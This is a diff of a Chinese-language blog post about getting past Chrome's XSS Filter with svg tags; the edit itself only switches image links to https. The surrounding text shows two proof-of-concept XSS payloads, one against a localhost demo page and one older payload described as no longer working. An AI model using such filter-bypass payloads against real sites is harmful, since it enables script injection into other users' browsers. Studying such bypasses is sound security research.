@@ -19,7 +19,7 @@
 
 <p>众所周知Chrome浏览器的Xss Filter是基于模糊匹配敏感关键字的方式进行拦截外部JavaScript脚本注入的，然而可以通过svg标签绕过Xss Filter.</p>
 
-<p><img src="http://blog-1252048719.cos.ap-shanghai.myqcloud.com/ysao8.png" /></p>
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/ysao8.png" /></p>
 
 <h4 id="details">Details</h4>
 
@@ -41,7 +41,7 @@ Payload:
 <pre><code>http://127.0.0.1/demo.php?xss=&lt;svg&gt;&lt;script&gt;/&lt;1/&gt;alert(document.domain)&lt;/script&gt;&lt;/svg&gt;
 </code></pre>
 
-<p><img src="http://blog-1252048719.cos.ap-shanghai.myqcloud.com/4rywe7.png" /></p>
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/4rywe7.png" /></p>
 
 <blockquote>
   <p>13年Gainover也分享过一个svg标签Bypass Chrome Xss Filter的Payload:<code>&lt;svg&gt;&lt;script xlink:href=data:,alert(1)&gt;&lt;/script&gt;&lt;/svg&gt;</code>现已失效.</p>
